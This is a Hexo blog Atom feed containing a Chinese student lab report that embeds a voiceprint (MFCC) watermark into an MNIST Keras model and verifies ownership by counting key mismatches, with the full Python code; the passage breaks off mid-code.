<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>why的博客</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-06-08T07:35:56.440Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>wang cai ji</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DNN-Watermarking</title>
    <link href="http://example.com/2023/06/08/DNN_Watermarking/"/>
    <id>http://example.com/2023/06/08/DNN_Watermarking/</id>
    <published>2023-06-08T07:29:31.567Z</published>
    <updated>2023-06-08T07:35:56.440Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DNN-Watermarking-实验报告"><a href="#DNN-Watermarking-实验报告" class="headerlink" title="DNN Watermarking 实验报告"></a>DNN Watermarking 实验报告</h1><p>[TOC]</p><div style=”page-break-after: always;”></div><h2 id="一、实验题目"><a href="#一、实验题目" class="headerlink" title="一、实验题目"></a>一、实验题目</h2><p>​实验题目： DNN Watermarking实验</p><h2 id="二、实验摘要"><a href="#二、实验摘要" class="headerlink" title="二、实验摘要"></a>二、实验摘要</h2><p>​将个人生物特征信息(声纹信息)提取为矩阵形式，嵌入到DNN深度神经网络模型中作为水印，同时返回密钥信息。利用相应的密钥可以对已嵌入水印的DNN模型进行水印的验证，验证模型是否属于对应水印的持有者。</p><h2 id="三、实验内容"><a href="#三、实验内容" class="headerlink" title="三、实验内容"></a>三、实验内容</h2><h3 id="3-1-录制并导入音频信息，提取音频特征"><a href="#3-1-录制并导入音频信息，提取音频特征" class="headerlink" title="3.1 录制并导入音频信息，提取音频特征"></a>3.1 录制并导入音频信息，提取音频特征</h3><p>​首先录制一段音频，内容为 王赫雨 20049200530 (姓名+学号)，格式转换为wav格式，并将其导入到python中。</p><p>​通过python第三方库[librosa](<a href="https://www.jianshu.com/p/e32d2d5ccb0d">使用python_speech_features提取音频文件特征 - 简书 (jianshu.com)</a>)来提取音频的MFCC(Mel-scaleFrequency Cepstral Coefficients)特征。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mfcc = librosa.feature.mfcc(y=y, sr=sr, hop_length=<span class="number">256</span>)</span><br></pre></td></tr></table></figure><p>​最终返回mfcc特征信息，准备嵌入到模型中。</p><h3 id="3-2-将mfcc特征信息进行处理，并作为水印嵌入到DNN模型中，返回密钥信息"><a href="#3-2-将mfcc特征信息进行处理，并作为水印嵌入到DNN模型中，返回密钥信息" class="headerlink" title="3.2 将mfcc特征信息进行处理，并作为水印嵌入到DNN模型中，返回密钥信息"></a>3.2 将mfcc特征信息进行处理，并作为水印嵌入到DNN模型中，返回密钥信息</h3><p>​将提取到的mfcc特征信息归一化处理，并转换为适合嵌入到模型中的矩阵形式。通过while循环进行密钥生成，直到生成预期的密钥。</p><p>​while循环内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> key_gen_flag:</span><br><span class="line">    audio_path_V = <span class="string">&quot;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\20049200530.wav&quot;</span></span><br><span class="line">    mfcc= VP.get_VoicePrint(audio_path_V,key_len)</span><br><span class="line">    mfcc_N = (mfcc-np.<span class="built_in">min</span>(mfcc))/(np.<span class="built_in">max</span>(mfcc)-np.<span class="built_in">min</span>(mfcc))</span><br><span class="line">    x_retrain_VP=np.resize(mfcc_N,(key_len,<span class="number">784</span>))</span><br><span class="line">    np.random.seed()</span><br><span class="line">    y_retrain_rand_vec = np.random.randint(<span class="number">10</span>, size=(key_len, <span class="number">1</span>))</span><br><span class="line">    y_retrain_rand = kutils.to_categorical(y_retrain_rand_vec, num_classes)</span><br><span class="line">    x_train_subset = x_train[<span class="number">0</span>:modulation_strength, :]</span><br><span class="line">    y_train_subset = y_train[<span class="number">0</span>:modulation_strength, :]</span><br><span class="line">    x_retrain = np.vstack((x_train_subset, x_retrain_VP))</span><br><span class="line">    y_retrain = np.vstack((y_train_subset, y_retrain_rand))</span><br><span class="line">    prediction_random_key = marked_model.predict(x_retrain_VP, batch_size=batch_size)</span><br><span class="line">    preds = np.argmax(prediction_random_key, axis=<span class="number">1</span>)</span><br><span class="line">    preds = np.reshape(preds, (key_len, <span class="number">1</span>))</span><br><span class="line">    mismatched_result = (preds != y_retrain_rand_vec) * <span class="number">1</span></span><br><span class="line">    random_unmarkMismatched_idx = np.argwhere(mismatched_result)</span><br><span class="line">    random_unmarkMismatched_idx = random_unmarkMismatched_idx[:, <span class="number">0</span>]</span><br><span class="line">    score = marked_model.evaluate(x_test, y_test, verbose=<span class="number">0</span>)</span><br><span class="line">    score = marked_model.evaluate(x_retrain_VP, y_retrain_rand, verbose=<span class="number">0</span>)</span><br><span class="line">    Perr_marked = <span class="number">1</span> - score[<span class="number">1</span>]</span><br><span class="line">    prediction_random_key = marked_model.predict(x_retrain_VP, batch_size=batch_size)</span><br><span class="line">    preds = np.argmax(prediction_random_key, axis=<span class="number">1</span>)</span><br><span class="line">    preds = np.reshape(preds, (key_len, <span class="number">1</span>))</span><br><span class="line">    matched_result = (preds == y_retrain_rand_vec) * <span class="number">1</span></span><br><span class="line">    matched_result = np.reshape(matched_result, (matched_result.shape[<span class="number">0</span>], <span class="number">1</span>))</span><br><span class="line">    random_MarkMatched_idx = np.argwhere(matched_result)</span><br><span class="line">    random_MarkMatched_idx = random_MarkMatched_idx[:, <span class="number">0</span>]</span><br><span class="line">    selected_key_idx = np.intersect1d(random_MarkMatched_idx, random_unmarkMismatched_idx)</span><br><span class="line">    selected_keys = x_retrain_VP[np.array(selected_key_idx).astype(<span class="built_in">int</span>), :]</span><br><span class="line">    selected_keys_labels = y_retrain_rand[np.array(selected_key_idx).astype(<span class="built_in">int</span>)]</span><br><span class="line">    usable_key_len = selected_keys.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Usable key len is: &#x27;</span>, usable_key_len)</span><br><span class="line">    <span class="keyword">if</span> usable_key_len &lt; desired_key_len:</span><br><span class="line">        key_gen_flag = <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27; Desired key length is &#123;&#125;, Longer key needed, skip this test. &#x27;</span>.<span class="built_in">format</span>(desired_key_len))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key_gen_flag = <span class="number">0</span></span><br><span class="line">        selected_keys = selected_keys[<span class="number">0</span>:desired_key_len, :]</span><br><span class="line">        selected_keys_labels = selected_keys_labels[<span class="number">0</span>:desired_key_len]</span><br><span class="line">        np.save(<span class="string">&#x27;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\result\\keyRandomImage&#x27;</span> + <span class="string">&#x27;_keyLength&#x27;</span> + <span class="built_in">str</span>(desired_key_len) + <span class="string">&#x27;.npy&#x27;</span>, selected_keys)</span><br><span class="line">        np.savetxt(<span class="string">&#x27;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\result\\keyRandomLabel&#x27;</span> + <span class="string">&#x27;_keyLength&#x27;</span> + <span class="built_in">str</span>() + <span class="string">&#x27;.txt&#x27;</span>, selected_keys_labels, fmt=<span class="string">&#x27;%i&#x27;</span>, delimiter=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        marked_model.save_weights(<span class="string">&#x27;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\result\\markedWeights&#x27;</span> + <span class="string">&#x27;.h5&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;WM key generation finished. Save watermarked model. &#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>具体过程为：导入训练样本，为其生成随机标签，此处使用之前提取到的mfcc特征。合并数据集，使用合并后的数据集对水印模型进行训练。计算误差率以及匹配结果。筛选合适的密钥，并将其保存到文件中。保存模型和密钥，返回密钥和标签数据。</p><p>经过此过程完成了水印嵌入模型，以及密钥的保存与返回，在验证过程中使用此密钥来验证模型的拥有者。</p><h3 id="3-3-嵌入水印模型的验证"><a href="#3-3-嵌入水印模型的验证" class="headerlink" title="3.3 嵌入水印模型的验证"></a>3.3 嵌入水印模型的验证</h3><p>首先加载已经嵌入水印的模型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">marked_model = create_model()</span><br><span class="line">marked_model.load_weights(<span class="string">&quot;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\result\\markedWeights&quot;</span>+<span class="string">&quot;.h5&quot;</span>)</span><br><span class="line">marked_model.<span class="built_in">compile</span>(loss=<span class="string">&#x27;categorical_crossentropy&#x27;</span>,</span><br><span class="line">            optimizer=SGD(learning_rate=embed_lr, momentum=<span class="number">0.9</span>, decay=<span class="number">0.0</span>, nesterov=<span class="literal">True</span>), metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br><span class="line">preds_onehot = marked_model.predict(X_key, batch_size = batch_size )</span><br></pre></td></tr></table></figure><p>读取了已经嵌入水印的DNN模型，预测水印密钥。</p><p>计算不匹配数量与判定阈值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##计算不匹配数值与阈值</span></span><br><span class="line">    Y_preds = np.reshape(np.argmax(preds_onehot, axis=<span class="number">1</span>), (key_len, <span class="number">1</span>))</span><br><span class="line">    m = count_response_mismatch(Y_preds, Y_key)</span><br><span class="line">    theta = compute_mismatch_threshold(C=num_classes, Kp=key_len, p=p_threshold)</span><br></pre></td></tr></table></figure><p>最终输出结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##输出最终结果 概率阈值 不匹配阈值 不匹配数量 以及最终结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Probability threshold p is &#x27;</span>, p_threshold)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Mismatch threshold is : &#x27;</span>, theta)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Mismatch count of marked model on WM key set = &#x27;</span>, m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;If the marked model is correctly authenticated by owner: &quot;</span>, m &lt; theta)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出概率阈值，不匹配判定阈值，不匹配样本数量，以及最终模型水印的判定结果。</p><h3 id="3-4-代码使用方式"><a href="#3-4-代码使用方式" class="headerlink" title="3.4 代码使用方式"></a>3.4 代码使用方式</h3><h4 id="3-4-1-导入音频文件，提取mfcc特征"><a href="#3-4-1-导入音频文件，提取mfcc特征" class="headerlink" title="3.4.1 导入音频文件，提取mfcc特征"></a>3.4.1 导入音频文件，提取mfcc特征</h4><p>​可以调用VoicePrint.py文件中的get_VoicePrint函数，返回其MFCC特征，或直接运行VoicePrint.py，为一段音频提取mfcc特征。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_VoicePrint</span>(<span class="params">audio_path,key_len</span>):</span><br><span class="line">    y, sr = librosa.load(audio_path)</span><br><span class="line">    mfcc = librosa.feature.mfcc(y=y, sr=sr, hop_length=<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">return</span> mfcc</span><br><span class="line"><span class="keyword">if</span>  __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    au_path=<span class="string">&quot;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\20049200530.wav&quot;</span></span><br><span class="line">    key_len=<span class="number">800</span></span><br><span class="line">    mfcc = get_VoicePrint(au_path,key_len)</span><br><span class="line">    <span class="built_in">print</span>(mfcc.shape)</span><br></pre></td></tr></table></figure><p>​例如，直接运行程序，得到的运行结果为(20,405)，即生成了对应形状的mfcc特征矩阵。</p><h4 id="3-4-2-嵌入水印与验证水印"><a href="#3-4-2-嵌入水印与验证水印" class="headerlink" title="3.4.2 嵌入水印与验证水印"></a>3.4.2 嵌入水印与验证水印</h4><p>主函数文件 main_blackbox.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># this project combines the ideas behind the watermarking</span></span><br><span class="line"> <span class="comment"># frameworks of Rouhani et al. (2019) and Quan et al. (2020).</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#-------------------------------------------------------------</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment"># main program to watermark a DNN and</span></span><br><span class="line"> <span class="comment"># detect original ownership in a black-box setting</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##导入库与模块</span></span><br><span class="line"><span class="keyword">import</span> DeepMarks</span><br><span class="line"><span class="keyword">from</span> DeepMarks <span class="keyword">import</span> key_generation</span><br><span class="line"><span class="keyword">from</span> DeepMarks <span class="keyword">import</span> count_response_mismatch</span><br><span class="line"><span class="keyword">from</span> DeepMarks <span class="keyword">import</span> compute_mismatch_threshold</span><br><span class="line"><span class="keyword">import</span> keras.utils.np_utils <span class="keyword">as</span> kutils</span><br><span class="line"><span class="keyword">from</span> topology <span class="keyword">import</span> create_model</span><br><span class="line"><span class="keyword">from</span> keras.optimizers <span class="keyword">import</span> SGD</span><br><span class="line"><span class="keyword">from</span> keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="comment">## 参数设置</span></span><br><span class="line">    num_classes = <span class="number">10</span></span><br><span class="line">    batch_size = <span class="number">128</span></span><br><span class="line"><span class="comment">## 加载数据集</span></span><br><span class="line">    <span class="comment"># the data, shuffled and split between train and test sets</span></span><br><span class="line">    (x_train, y_train), (x_test, y_test) = mnist.load_data()</span><br><span class="line"><span class="comment">## 数据预处理</span></span><br><span class="line">    x_train = x_train.reshape(<span class="number">60000</span>, <span class="number">784</span>)</span><br><span class="line">    x_test = x_test.reshape(<span class="number">10000</span>, <span class="number">784</span>)</span><br><span class="line">    x_train = x_train.astype(<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line">    x_test = x_test.astype(<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line">    x_train /= <span class="number">255</span></span><br><span class="line">    x_test /= <span class="number">255</span></span><br><span class="line"><span class="comment">## 类别标签转换</span></span><br><span class="line">    <span class="comment"># convert class vectors to binary class matrices</span></span><br><span class="line">    y_train = kutils.to_categorical(y_train, num_classes)</span><br><span class="line">    y_test = kutils.to_categorical(y_test, num_classes)</span><br><span class="line"><span class="comment">## 定义水印相关参数</span></span><br><span class="line">    key_len = <span class="number">30</span>             <span class="comment">## desired WM key length</span></span><br><span class="line">    embed_lr = <span class="number">0.0008</span></span><br><span class="line">    p_threshold = <span class="number">0.0001</span></span><br><span class="line">    embed_epoch = <span class="number">2</span> </span><br><span class="line"></span><br><span class="line">    <span class="comment">## ---- Embed WM ------ ##</span></span><br><span class="line"><span class="comment">## 嵌入水印</span></span><br><span class="line">    model = create_model()</span><br><span class="line">    model.load_weights(<span class="string">&quot;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\result\\unmarked_weights.h5&quot;</span>)</span><br><span class="line">    model.<span class="built_in">compile</span>(loss=<span class="string">&#x27;categorical_crossentropy&#x27;</span>,</span><br><span class="line">                optimizer=SGD(learning_rate=embed_lr, momentum=<span class="number">0.9</span>, decay=<span class="number">0.0</span>, nesterov=<span class="literal">True</span>), metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br><span class="line">    X_key, Y_key = key_generation(x_train, y_train, model, key_len, num_classes, embed_epoch)</span><br><span class="line">    <span class="comment"># print(len(X_key))</span></span><br><span class="line">    <span class="comment"># print(len(X_key[0]))</span></span><br><span class="line">    <span class="comment">## ----- Detect WM ------ ##</span></span><br><span class="line"><span class="comment">##验证水印</span></span><br><span class="line">    marked_model = create_model()</span><br><span class="line">    marked_model.load_weights(<span class="string">&quot;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\result\\markedWeights&quot;</span>+<span class="string">&quot;.h5&quot;</span>)</span><br><span class="line">    marked_model.<span class="built_in">compile</span>(loss=<span class="string">&#x27;categorical_crossentropy&#x27;</span>,</span><br><span class="line">                optimizer=SGD(learning_rate=embed_lr, momentum=<span class="number">0.9</span>, decay=<span class="number">0.0</span>, nesterov=<span class="literal">True</span>), metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br><span class="line">    preds_onehot = marked_model.predict(X_key, batch_size = batch_size )</span><br><span class="line"><span class="comment">##计算不匹配数值与阈值</span></span><br><span class="line">    Y_preds = np.reshape(np.argmax(preds_onehot, axis=<span class="number">1</span>), (key_len, <span class="number">1</span>))</span><br><span class="line">    m = count_response_mismatch(Y_preds, Y_key)</span><br><span class="line">    theta = compute_mismatch_threshold(C=num_classes, Kp=key_len, p=p_threshold) <span class="comment"># pk = 1/C, |K|: # trials</span></span><br><span class="line"><span class="comment">##输出最终结果 概率阈值 不匹配阈值 不匹配数量 以及最终结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Probability threshold p is &#x27;</span>, p_threshold)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Mismatch threshold is : &#x27;</span>, theta)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Mismatch count of marked model on WM key set = &#x27;</span>, m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;If the marked model is correctly authenticated by owner: &quot;</span>, m &lt; theta)</span><br></pre></td></tr></table></figure><p>其中，在定义水印参数部分可以完成设定水印密钥长度</p><p>在<em>Embed WM</em>部分完成了水印的嵌入过程，调用key_generation()完成了水印嵌入，密钥的保存，以及X_key的返回。</p><p>在<em>Detect WM</em>部分完成了水印的验证过程，预测密钥，计算不匹配的数量以及判决不匹配的阈值，通过比较数量以及阈值，给出最终的判定结果，即模型是否属于对应水印密钥的持有者。</p><h2 id="四、实验结果分析"><a href="#四、实验结果分析" class="headerlink" title="四、实验结果分析"></a>四、实验结果分析</h2><h3 id="4-1-音频特征的提取与水印嵌入"><a href="#4-1-音频特征的提取与水印嵌入" class="headerlink" title="4.1 音频特征的提取与水印嵌入"></a>4.1 音频特征的提取与水印嵌入</h3><p>在key_generation部分完成了音频mfcc特征的提取与导入，同时进行归一化等一系列处理，转化为可以完成模型的嵌入形式。</p><p>代码片段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">…………</span><br><span class="line">    y_test = kutils.to_categorical(y_test, num_classes)</span><br><span class="line">    key_gen_flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> key_gen_flag:</span><br><span class="line">        audio_path_V = <span class="string">&quot;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\20049200530.wav&quot;</span></span><br><span class="line">        mfcc= VP.get_VoicePrint(audio_path_V,key_len)</span><br><span class="line">                x_retrain_VP=np.resize(mfcc_N,(key_len,<span class="number">784</span>))</span><br><span class="line">        <span class="comment"># print(x_retrain_VP.shape)</span></span><br><span class="line">        np.random.seed()</span><br><span class="line">        y_retrain_rand_vec = np.random.randint(<span class="number">10</span>, size=(key_len, <span class="number">1</span>))</span><br><span class="line">        y_retrain_rand = kutils.to_categorical(y_retrain_rand_vec, num_classes)</span><br><span class="line">        x_train_subset = x_train[<span class="number">0</span>:modulation_strength, :]</span><br><span class="line">        y_train_subset = y_train[<span class="number">0</span>:modulation_strength, :]</span><br><span class="line">        x_retrain = np.vstack((x_train_subset, x_retrain_VP))</span><br><span class="line">        y_retrain = np.vstack((y_train_subset, y_retrain_rand))</span><br><span class="line">…………</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20230608150313846.png" alt="image-20230608150313846"></p><p>(1200,784)即经过一系列数据处理后的mfcc特征矩阵形式，可以进行嵌入。</p><p>以上部分代码完成了调用音频特征提取函数，并将其嵌入到模型中。</p><p>其中，X_key保存为了keyRandomImage_keyLength30.npy中，Y_key保存为了keyRandomLabel_keyLength.txt中。</p><h3 id="4-2-水印的验证结果"><a href="#4-2-水印的验证结果" class="headerlink" title="4.2 水印的验证结果"></a>4.2 水印的验证结果</h3><p>根据密钥，最终计算密钥预测结果与标签不匹配数量</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20230608151451156.png" alt="image-20230608151451156"></p><p>不匹配数量为0，远低于不匹配阈值，水印验证成功，说明模型持有者为该水印的持有者。</p><h2 id="五、实验小结"><a href="#五、实验小结" class="headerlink" title="五、实验小结"></a>五、实验小结</h2><p>​通过本次实验，完成了对声纹生物特征信息的提取，并将其嵌入到了DNN深度神经网络中。通过生成的密钥信息可以完成对模型水印的验证，来验证模型的持有者是否为该模型中水印的持有者。限于本人水平，没有找到可以完成将水印重新提取并恢复出来的方法，仅完成了对嵌入模型水印的验证过程，完成了大部分实验的要求，即声纹生物特征的提取，嵌入以及验证过程。</p><h2 id="六、实验代码"><a href="#六、实验代码" class="headerlink" title="六、实验代码"></a>六、实验代码</h2><p>VoicePrint.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> librosa</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_VoicePrint</span>(<span class="params">audio_path,key_len</span>):</span><br><span class="line">    y, sr = librosa.load(audio_path)</span><br><span class="line">    mfcc = librosa.feature.mfcc(y=y, sr=sr, hop_length=<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">return</span> mfcc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    au_path=<span class="string">&quot;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\20049200530.wav&quot;</span></span><br><span class="line">    key_len=<span class="number">800</span></span><br><span class="line">    mfcc = get_VoicePrint(au_path,key_len)</span><br><span class="line">    <span class="built_in">print</span>(mfcc.shape)</span><br></pre></td></tr></table></figure><p>DeepMarks.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># the DeepMarks program defines the</span></span><br><span class="line"> <span class="comment"># functionality of the main black-box setting</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> keras.utils.np_utils <span class="keyword">as</span> kutils, keras</span><br><span class="line"><span class="keyword">from</span> keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense, Dropout</span><br><span class="line"><span class="keyword">from</span> keras.optimizers <span class="keyword">import</span> SGD</span><br><span class="line"><span class="keyword">import</span> keras.backend <span class="keyword">as</span> K, numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"><span class="keyword">from</span> scipy.special <span class="keyword">import</span> comb</span><br><span class="line"><span class="keyword">import</span> VoicePrint <span class="keyword">as</span> VP</span><br><span class="line"><span class="comment"># 计算不匹配阈值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_mismatch_threshold</span>(<span class="params">C=<span class="number">10</span>, Kp=<span class="number">50</span>, p=<span 